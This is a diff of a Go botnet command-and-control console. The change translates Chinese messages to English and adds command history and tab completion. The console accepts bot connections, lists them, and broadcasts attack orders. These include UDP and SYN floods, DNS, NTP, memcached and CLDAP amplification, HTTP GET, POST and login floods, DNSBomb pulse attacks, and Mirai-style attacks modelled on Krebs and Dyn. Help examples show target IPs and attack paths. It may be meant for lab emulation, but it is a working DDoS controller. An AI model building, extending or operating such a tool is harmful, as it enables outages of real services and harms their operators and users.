@@ -8,6 +8,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+	
+	"github.com/chzyer/readline"
 )
 
 type BotInfo struct {
@@ -38,23 +40,23 @@ func showBanner() {
 | |___ / __/| |_| | |_| | |_| |
  \____|_____|\___/ \___/ \___/  v2.1`)
 
-	fmt.Println("\nC2 控制中心已初始化")
-	fmt.Println("输入 'help' 查看可用命令")
+	fmt.Println("\nC2 Control Center Initialized")
+	fmt.Println("Type 'help' to see available commands")
 }
 
 func startC2Server() {
 	listener, err := net.Listen("tcp", ":80")
 	if err != nil {
-		fmt.Println("C2 服务器启动失败:", err)
+		fmt.Println("C2 server startup failed:", err)
 		os.Exit(1)
 	}
 	defer listener.Close()
 
-	fmt.Println("\n[+] C2 服务器正在监听 0.0.0.0:80")
+	fmt.Println("\n[+] C2 server listening on 0.0.0.0:80")
 	for {
 		conn, err := listener.Accept()
 		if err != nil {
-			fmt.Println("连接错误:", err)
+			fmt.Println("Connection error:", err)
 			continue
 		}
 		go handleNewBot(conn)
@@ -69,7 +71,7 @@ func handleNewBot(conn net.Conn) {
 		Conn:        conn,
 		ConnectTime: now,
 		LastActive:  now,
-		Status:      "在线",
+		Status:      "Online",
 	}
 
 	botMu.Lock()
@@ -77,7 +79,7 @@ func handleNewBot(conn net.Conn) {
 	botMu.Unlock()
 
 	logConnection(botIP)
-	fmt.Printf("[+] 新僵尸主机已连接: %s\n", botIP)
+	fmt.Printf("[+] New bot connected: %s\n", botIP)
 
 	go monitorBotConnection(bot, botIP)
 }
@@ -86,10 +88,10 @@ func monitorBotConnection(bot *BotInfo, botIP string) {
 	defer func() {
 		bot.Conn.Close()
 		botMu.Lock()
-		bot.Status = "离线"
+		bot.Status = "Offline"
 		bot.DisconnectTime = time.Now()
 		botMu.Unlock()
-		fmt.Printf("[!] 僵尸主机已断开连接: %s\n", botIP)
+		fmt.Printf("[!] Bot disconnected: %s\n", botIP)
 	}()
 
 	reader := bufio.NewReader(bot.Conn)
@@ -104,7 +106,7 @@ func monitorBotConnection(bot *BotInfo, botIP string) {
 		processBotMessage(bot, msg)
 		botMu.Unlock()
 
-		fmt.Printf("[%s] 状态更新: %s", botIP, msg)
+		fmt.Printf("[%s] Status update: %s", botIP, msg)
 	}
 }
 
@@ -112,10 +114,10 @@ func processBotMessage(bot *BotInfo, msg string) {
 	msg = strings.TrimSpace(msg)
 	switch {
 	case msg == "TASK_COMPLETE":
-		bot.Status = "在线"
+		bot.Status = "Online"
 		bot.CurrentTask = ""
 	case msg == "STOP":
-		bot.Status = "空闲"
+		bot.Status = "Idle"
 		bot.CurrentTask = ""
 	case strings.HasPrefix(msg, "TASK_PROGRESS "):
 		bot.CurrentTask = strings.TrimPrefix(msg, "TASK_PROGRESS ")
@@ -132,11 +134,62 @@ func logConnection(ip string) {
 }
 
 func handleUserInput() {
-	reader := bufio.NewReader(os.Stdin)
+	// Create readline instance with command history support
+	rl, err := readline.NewEx(&readline.Config{
+		Prompt:          "C2> ",
+		HistoryFile:     ".c2_history", // Save history to file
+		InterruptPrompt: "^C",
+		EOFPrompt:       "exit",
+	})
+	if err != nil {
+		fmt.Println("Failed to initialize command line:", err)
+		os.Exit(1)
+	}
+	defer rl.Close()
+
+	// Set up auto-completion
+	rl.Config.AutoComplete = readline.NewPrefixCompleter(
+		readline.PcItem("attack",
+			readline.PcItem("UDP"),
+			readline.PcItem("SYN"),
+			readline.PcItem("DNS"),
+			readline.PcItem("NTP"),
+			readline.PcItem("CLDAP"),
+			readline.PcItem("RDP"),
+			readline.PcItem("SSDP"),
+			readline.PcItem("SNMP"),
+			readline.PcItem("CHARGEN"),
+			readline.PcItem("OPENVPN"),
+			readline.PcItem("MEMCACHED"),
+			readline.PcItem("DNSBOMB"),
+			readline.PcItem("DNSBOOMERANG"),
+			readline.PcItem("GET"),
+			readline.PcItem("COOKIE"),
+			readline.PcItem("POST"),
+			readline.PcItem("LOGIN"),
+			readline.PcItem("DEEPSEEK_1"),
+			readline.PcItem("DEEPSEEK_2"),
+			readline.PcItem("MIRAI_1"),
+			readline.PcItem("MIRAI_2"),
+		),
+		readline.PcItem("list"),
+		readline.PcItem("info"),
+		readline.PcItem("clear"),
+		readline.PcItem("help"),
+		readline.PcItem("stop"),
+		readline.PcItem("exit"),
+	)
+
 	for {
-		fmt.Print("\nC2> ")
-		input, _ := reader.ReadString('\n')
-		input = strings.TrimSpace(input)
+		line, err := rl.Readline()
+		if err != nil { // io.EOF, readline.ErrInterrupt
+			if err == readline.ErrInterrupt {
+				continue // Handle Ctrl+C
+			}
+			break
+		}
+
+		input := strings.TrimSpace(line)
 		if input == "" {
 			continue
 		}
@@ -157,6 +210,7 @@ func handleUserInput() {
 			showBotInfo(args[1:])
 		case "clear":
 			clearScreen()
+			rl.SetPrompt("C2> ") // Reset prompt after clearing screen
 		case "help":
 			showHelp()
 		case "stop":
@@ -164,15 +218,15 @@ func handleUserInput() {
 		case "exit":
 			cleanExit()
 		default:
-			fmt.Println("[!] 未知命令，请输入 'help' 查看可用命令")
+			fmt.Println("[!] Unknown command. Type 'help' to see available commands")
 		}
 	}
 }
 
 func handleAttackCommand(args []string) {
 	if len(args) < 3 {
-		fmt.Println("[!] 使用方法: attack <方法> <目标IP> <端口> [可选参数]")
-		fmt.Println("可用方法: UDP, SYN, DNS, NTP, CLDAP, RDP, SSDP, SNMP, CHARGEN, OPENVPN, MEMCACHED, DNSBomb, DNSBoomerang, GET, COOKIE, POST, LOGIN, DEEPSEEK_1, DEEPSEEK_2, MIRAI_1, MIRAI_2")
+		fmt.Println("[!] Usage: attack <method> <target IP> <port> [optional params] [bot IP]")
+		fmt.Println("Available methods: UDP, SYN, DNS, NTP, CLDAP, RDP, SSDP, SNMP, CHARGEN, OPENVPN, MEMCACHED, DNSBomb, DNSBoomerang, GET, COOKIE, POST, LOGIN, DEEPSEEK_1, DEEPSEEK_2, MIRAI_1, MIRAI_2")
 		return
 	}
 
@@ -180,37 +234,37 @@ func handleAttackCommand(args []string) {
 	target := args[1]
 	port := args[2]
 	
-	// 定义需要路径参数的HTTP相关攻击方法
+	// Define HTTP-related attack methods that require path parameter
 	httpMethods := map[string]bool{
-		"GET":    true,
-		"COOKIE": true,
-		"POST":   true,
-		"LOGIN":  true,
+		"GET":        true,
+		"COOKIE":     true,
+		"POST":       true,
+		"LOGIN":      true,
 		"DEEPSEEK_2": true,
 	}
 
-	// 处理可选参数
+	// Handle optional parameters
 	param4 := ""
 	var botIP string
 
-	// 第四个参数的处理逻辑根据攻击方法而不同
+	// Processing logic for the fourth parameter depends on attack method
 	if len(args) > 3 {
-		// 如果是HTTP相关攻击，第四个参数是路径
+		// For HTTP attacks, the fourth parameter is the path
 		if httpMethods[method] {
 			param4 = args[3]
-			// 如果还有第五个参数，那么它是僵尸主机IP
+			// If there's a fifth parameter, it's the bot IP
 			if len(args) > 4 {
 				botIP = args[4]
 			}
 		} else {
-			// 对于非HTTP攻击，检查第四个参数是否是IP地址
+			// For non-HTTP attacks, check if the fourth parameter is an IP address
 			if net.ParseIP(args[3]) != nil {
 				botIP = args[3]
 			} else {
-				// 不是IP地址，作为其他攻击参数
+				// Not an IP address, treat as attack parameter
 				param4 = args[3]
 			}
-			// 如果有第五个参数，则一定是指定僵尸主机
+			// If there's a fifth parameter, it must be a bot IP
 			if len(args) > 4 {
 				botIP = args[4]
 			}
@@ -242,11 +296,11 @@ func handleAttackCommand(args []string) {
 	}
 
 	if !validMethods[method] {
-		fmt.Println("[!] 无效的攻击方法")
+		fmt.Println("[!] Invalid attack method")
 		return
 	}
 
-	// 构建命令字符串，确保全部大写
+	// Build command string, ensure uppercase
 	command := fmt.Sprintf("%s %s %s %s", method, target, port, param4)
 	sendBotCommand(command, botIP)
 }
@@ -257,21 +311,21 @@ func sendBotCommand(command, botIP string) {
 
 	sent := 0
 	if botIP != "" {
-		if bot, exists := bots[botIP]; exists && bot.Status == "在线" {
-			// 直接发送命令，不再发送 STOP
+		if bot, exists := bots[botIP]; exists && bot.Status == "Online" {
+			// Send command directly, no longer sending STOP first
 			if sendCommandToBot(bot, command) {
-				bot.Status = "在线"
+				bot.Status = "Online"
 				bot.CurrentTask = command
 				sent++
 			}
 		} else {
-			fmt.Printf("[!] 指定的僵尸主机不可用: %s\n", botIP)
+			fmt.Printf("[!] Specified bot unavailable: %s\n", botIP)
 			return
 		}
 	} else {
 		for _, bot := range bots {
-			if bot.Status == "在线" {
-				// 直接发送命令，不再发送 STOP
+			if bot.Status == "Online" {
+				// Send command directly, no longer sending STOP first
 				if sendCommandToBot(bot, command) {
 					bot.CurrentTask = command
 					sent++
@@ -280,13 +334,13 @@ func sendBotCommand(command, botIP string) {
 		}
 	}
 
-	fmt.Printf("\n[+] 成功发送命令至 %d 个僵尸主机\n", sent)
+	fmt.Printf("\n[+] Successfully sent command to %d bots\n", sent)
 }
 
 func sendCommandToBot(bot *BotInfo, command string) bool {
 	_, err := fmt.Fprintf(bot.Conn, "%s\n", command)
 	if err != nil {
-		bot.Status = "离线"
+		bot.Status = "Offline"
 		return false
 	}
 	return true
@@ -296,24 +350,24 @@ func showBotList() {
 	botMu.Lock()
 	defer botMu.Unlock()
 
-	fmt.Println("\n活动僵尸主机列表:")
+	fmt.Println("\nActive Bot List:")
 	fmt.Printf("%-18s %-22s %-22s %-8s %s\n",
-		"IP 地址", "连接时间", "最后活跃时间", "状态", "当前任务")
+		"IP Address", "Connect Time", "Last Active", "Status", "Current Task")
 
 	for ip, bot := range bots {
 		status := ""
 		switch bot.Status {
-		case "在线":
-			status = "\033[32m在线\033[0m"
-		case "离线":
-			status = "\033[31m离线\033[0m"
+		case "Online":
+			status = "\033[32mOnline\033[0m"
+		case "Offline":
+			status = "\033[31mOffline\033[0m"
 		default:
 			status = bot.Status
 		}
 
 		task := bot.CurrentTask
 		if task == "" {
-			task = "空闲"
+			task = "Idle"
 		}
 
 		fmt.Printf("%-18s %-22s %-22s %-8s %s\n",
@@ -331,49 +385,49 @@ func clearScreen() {
 
 func showHelp() {
 	fmt.Println(`
-可用命令:
-  attack <方法> <目标IP> <端口> [可选参数] [僵尸主机IP] - 发起攻击
-  list                                               - 列出所有僵尸主机
-  info <僵尸主机IP>                                  - 显示僵尸主机详情
-  clear                                              - 清屏
-  help                                               - 显示帮助
-  stop                                               - 终止指定僵尸主机/全部僵尸主机
-  exit                                               - 退出程序
+Available Commands:
+  attack <method> <target IP> <port> [optional params] [bot IP] - Launch attack
+  list                                                         - List all bots
+  info <bot IP>                                                - Show bot details
+  clear                                                        - Clear screen
+  help                                                         - Show help
+  stop                                                         - Stop specified/all bots
+  exit                                                         - Exit program
 
-攻击方法:
-  UDP           - UDP 洪水攻击
-  SYN           - TCP SYN 洪水
-  DNS           - DNS 放大攻击
-  NTP           - NTP 攻击
-  CLDAP         - CLDAP 攻击
-  RDP           - RDP 攻击
-  SSDP          - SSDP 攻击
-  SNMP          - SNMP 攻击
-  CHARGEN       - CHARGEN 攻击
-  OPENVPN       - OPENVPN 攻击
-  MEMCACHED     - MEMCACHED 攻击
-  DNSBOMB       - 24年IEEE S&P论文中的脉冲DoS攻击
-  DNSBOOMERANG  - 脉冲DNS攻击
-  GET           - HTTP GET 请求网页，需要指定攻击路径，建议请求需要数据库交互的页面
-  COOKIE        - HTTP GET 发送大量 Cookie 请求，需要指定攻击路径
-  POST          - HTTP POST 洪水攻击，需要指定攻击路径，请求体默认
-  LOGIN         - HTTP POST 发送大量登录请求，需要指定攻击路径
-  DEEPSEEK_1    - DeepSeek 第一阶段攻击
-  DEEPSEEK_2    - DeepSeek 第二阶段攻击
-  MIRAI_1       - Mirai 模拟攻击Kerbs
-  MIRAI_2       - Mirai 模拟攻击Dyn
+Attack Methods:
+  UDP           - UDP flood attack
+  SYN           - TCP SYN flood
+  DNS           - DNS amplification attack
+  NTP           - NTP attack
+  CLDAP         - CLDAP attack
+  RDP           - RDP attack
+  SSDP          - SSDP attack
+  SNMP          - SNMP attack
+  CHARGEN       - CHARGEN attack
+  OPENVPN       - OPENVPN attack
+  MEMCACHED     - MEMCACHED attack
+  DNSBOMB       - Pulse DoS attack from 2024 IEEE S&P paper
+  DNSBOOMERANG  - Pulse DNS attack
+  GET           - HTTP GET request, requires attack path, recommended for pages with DB interaction
+  COOKIE        - HTTP GET with massive Cookie requests, requires attack path
+  POST          - HTTP POST flood attack, requires attack path, default request body
+  LOGIN         - HTTP POST with massive login requests, requires attack path
+  DEEPSEEK_1    - DeepSeek phase 1 attack
+  DEEPSEEK_2    - DeepSeek phase 2 attack
+  MIRAI_1       - Mirai simulated attack on Kerbs
+  MIRAI_2       - Mirai simulated attack on Dyn
 
-示例:
+Examples:
   attack UDP 192.168.1.100 80
   attack SYN 10.0.0.5 443 192.168.2.15
   attack GET 10.100.0.150 80 /history.html
   attack POST 10.100.0.150 80 /login.php
-  stop 10.0.0.1                           - 终止指定僵尸主机
-  stop                                    - 终止所有僵尸主机`)
+  stop 10.0.0.1                           - Stop specified bot
+  stop                                    - Stop all bots`)
 }
 
 func cleanExit() {
-	fmt.Println("\n[!] 正在断开所有僵尸主机连接...")
+	fmt.Println("\n[!] Disconnecting all bots...")
 	botMu.Lock()
 	for _, bot := range bots {
 		bot.Conn.Close()
@@ -384,7 +438,7 @@ func cleanExit() {
 
 func showBotInfo(args []string) {
 	if len(args) == 0 {
-		fmt.Println("[!] 请指定僵尸主机 IP")
+		fmt.Println("[!] Please specify bot IP")
 		return
 	}
 
@@ -393,19 +447,19 @@ func showBotInfo(args []string) {
 	defer botMu.Unlock()
 
 	if bot, exists := bots[botIP]; exists {
-		fmt.Printf("\n僵尸主机详情 - %s\n", botIP)
+		fmt.Printf("\nBot Details - %s\n", botIP)
 		fmt.Println("--------------------------------------")
-		fmt.Printf("状态:        %s\n", bot.Status)
-		fmt.Printf("连接时间:    %s\n", bot.ConnectTime.Format("2006-01-02 15:04:05"))
-		fmt.Printf("最后活跃时间: %s\n", bot.LastActive.Format("2006-01-02 15:04:05"))
-		if bot.Status == "离线" {
-			fmt.Printf("断开时间:    %s\n", bot.DisconnectTime.Format("2006-01-02 15:04:05"))
+		fmt.Printf("Status:       %s\n", bot.Status)
+		fmt.Printf("Connect Time: %s\n", bot.ConnectTime.Format("2006-01-02 15:04:05"))
+		fmt.Printf("Last Active:  %s\n", bot.LastActive.Format("2006-01-02 15:04:05"))
+		if bot.Status == "Offline" {
+			fmt.Printf("Disconnect:   %s\n", bot.DisconnectTime.Format("2006-01-02 15:04:05"))
 		}
-		fmt.Printf("当前任务:    %s\n", bot.CurrentTask)
-		fmt.Printf("连接状态:    %v\n", bot.Conn)
+		fmt.Printf("Current Task: %s\n", bot.CurrentTask)
+		fmt.Printf("Connection:   %v\n", bot.Conn)
 		fmt.Println("--------------------------------------")
 	} else {
-		fmt.Println("[!] 指定的僵尸主机未找到")
+		fmt.Println("[!] Specified bot not found")
 	}
 }
 
@@ -424,22 +478,22 @@ func sendStopToAllBots() {
 
 	sentCount := 0
 	for _, bot := range bots {
-		if bot.Status == "在线" {
+		if bot.Status == "Online" {
 			sendCommandToBot(bot, "STOP")
 			sentCount++
 		}
 	}
-	fmt.Printf("[+] 已向 %d 个在线僵尸主机发送停止指令\n", sentCount)
+	fmt.Printf("[+] Sent stop command to %d online bots\n", sentCount)
 }
 
 func sendStopToSpecificBot(ip string) {
 	botMu.Lock()
 	defer botMu.Unlock()
 
-	if bot, exists := bots[ip]; exists && bot.Status == "在线" {
+	if bot, exists := bots[ip]; exists && bot.Status == "Online" {
 		sendCommandToBot(bot, "STOP")
-		fmt.Printf("[+] 已向 %s 发送停止指令\n", ip)
+		fmt.Printf("[+] Sent stop command to %s\n", ip)
 	} else {
-		fmt.Printf("[!] %s 不在线或不存在\n", ip)
+		fmt.Printf("[!] %s is not online or doesn't exist\n", ip)
 	}
 }
